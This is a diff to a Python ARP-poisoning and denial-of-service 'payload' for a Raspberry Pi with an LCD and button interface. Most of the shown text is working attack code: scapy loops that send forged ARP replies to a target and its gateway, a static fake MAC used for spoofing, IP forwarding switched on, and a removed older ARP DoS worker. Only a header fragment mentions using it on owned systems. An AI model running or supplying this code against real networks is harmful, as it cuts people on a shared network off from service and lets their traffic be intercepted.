@@ -18,7 +18,6 @@ with extreme caution and only on systems you own.
 """
 
 import os, sys, subprocess, signal, time, threading
-sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
@@ -41,6 +40,7 @@ except ImportError:
 # --- CONFIGURATION ---
 TARGET_IP = "192.168.1.10" # Default target IP, will be configurable
 GATEWAY_IP = "192.168.1.1" # Default gateway IP, will be configurable
+FAKE_MAC = "00:11:22:33:44:55" # A static fake MAC address for ARP poisoning
 
 # --- GPIO & LCD ---
 PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
@@ -58,11 +58,13 @@ status_msg = "Press OK to start"
 current_ip_input = "" # Used for dynamic IP input
 ip_input_cursor_pos = 0
 current_ip_type = "" # "target" or "gateway"
+ATTACK_INTERFACE = None # Stores the interface used for the current attack
 
 def cleanup(*_):
-    global running
+    global running, ATTACK_INTERFACE
     running = False
-    restore_arp_tables() # Restore ARP tables on exit
+    if ATTACK_INTERFACE:
+        restore_arp_tables(ATTACK_INTERFACE) # Restore ARP tables on exit
 
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
@@ -162,28 +164,7 @@ def handle_ip_input_logic(initial_ip):
     return None
 
 # --- Attack Logic ---
-def arp_dos_worker():
-    global packet_count
-    if not gateway_ip:
-        print("Error: Gateway IP not found.", file=sys.stderr)
-        return
 
-    # op=2 means "is-at" (an ARP reply)
-    # We are telling the TARGET_IP that the GATEWAY_IP is at FAKE_MAC
-    p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=gateway_ip, pdst=TARGET_IP, hwsrc=FAKE_MAC)
-    
-    while not attack_stop_event.is_set():
-        sendp(p, iface="eth0", verbose=0)
-        packet_count += 1
-        time.sleep(1)
-
-def start_attack():
-    global attack_thread, packet_count
-    if not (attack_thread and attack_thread.is_alive()):
-        packet_count = 0
-        attack_stop_event.clear()
-        attack_thread = threading.Thread(target=arp_dos_worker, daemon=True)
-        attack_thread.start()
 
 def stop_attack():
     attack_stop_event.set()
@@ -203,7 +184,7 @@ def get_mac(ip):
         print(f"Error getting MAC for {ip}: {e}", file=sys.stderr)
     return None
 
-def restore_arp_tables():
+def restore_arp_tables(interface):
     """Restores ARP tables on target and gateway."""
     global TARGET_IP, GATEWAY_IP
     if not TARGET_IP or not GATEWAY_IP:
@@ -215,9 +196,9 @@ def restore_arp_tables():
     if target_mac and gateway_mac:
         print(f"Restoring ARP tables for {TARGET_IP} and {GATEWAY_IP}...", file=sys.stderr)
         # Tell target that gateway is at gateway_mac
-        send(ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP, hwdst=target_mac, hwsrc=gateway_mac), verbose=0)
+        send(ARP(op=2, pdst=TARGET_IP, psrc=GATEWAY_IP, hwdst=target_mac, hwsrc=gateway_mac), iface=interface, verbose=0)
         # Tell gateway that target is at target_mac
-        send(ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP, hwdst=gateway_mac, hwsrc=target_mac), verbose=0)
+        send(ARP(op=2, pdst=GATEWAY_IP, psrc=TARGET_IP, hwdst=gateway_mac, hwsrc=target_mac), iface=interface, verbose=0)
         print("ARP tables restored.", file=sys.stderr)
     else:
         print("Could not restore ARP tables (MACs not found).", file=sys.stderr)
@@ -240,9 +221,9 @@ def arp_poison_worker(target_ip, gateway_ip, interface):
     
     # Create ARP packets
     # Tell target that we are the gateway
-    packet1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
+    packet1 = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=FAKE_MAC)
     # Tell gateway that we are the target
-    packet2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)
+    packet2 = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=FAKE_MAC)
     
     while running:
         send(packet1, iface=interface, verbose=0)
@@ -250,7 +231,7 @@ def arp_poison_worker(target_ip, gateway_ip, interface):
         time.sleep(2) # Send every 2 seconds
 
 def run_attack():
-    global status_msg, attack_thread, TARGET_IP, GATEWAY_IP
+    global status_msg, attack_thread, TARGET_IP, GATEWAY_IP, ATTACK_INTERFACE
     
     if not WIFI_INTEGRATION_AVAILABLE:
         status_msg = "WiFi integration\nnot available!"
@@ -260,6 +241,8 @@ def run_attack():
     if not interface:
         status_msg = "No active network\ninterface found!"
         return False
+    
+    ATTACK_INTERFACE = interface # Store the interface for cleanup
     
     # Enable IP Forwarding
     subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True, check=True, capture_output=True)
@@ -333,36 +316,3 @@ finally:
     LCD.LCD_Clear()
     GPIO.cleanup()
     print("ARP Poison DoS payload finished.")
-try:
-    is_attacking = False
-    gateway_ip = subprocess.check_output("ip route | awk '/default/ {print $3}'", shell=True).decode().strip()
-    if not gateway_ip:
-        draw_ui("No Gateway!")
-        time.sleep(3)
-        raise SystemExit("Could not determine gateway IP.")
-
-    while running:
-        draw_ui("ACTIVE" if is_attacking else "STOPPED")
-        
-        start_wait = time.time()
-        while time.time() - start_wait < 1.0:
-            if GPIO.input(PINS["KEY3"]) == 0:
-                cleanup()
-                break
-            if GPIO.input(PINS["OK"]) == 0:
-                is_attacking = not is_attacking
-                if is_attacking:
-                    start_attack()
-                else:
-                    stop_attack()
-                time.sleep(0.3)
-                break
-            time.sleep(0.05)
-        if not running: break
-except (KeyboardInterrupt, SystemExit):
-    pass
-finally:
-    cleanup()
-    LCD.LCD_Clear()
-    GPIO.cleanup()
-    print("ARP DoS payload finished.")
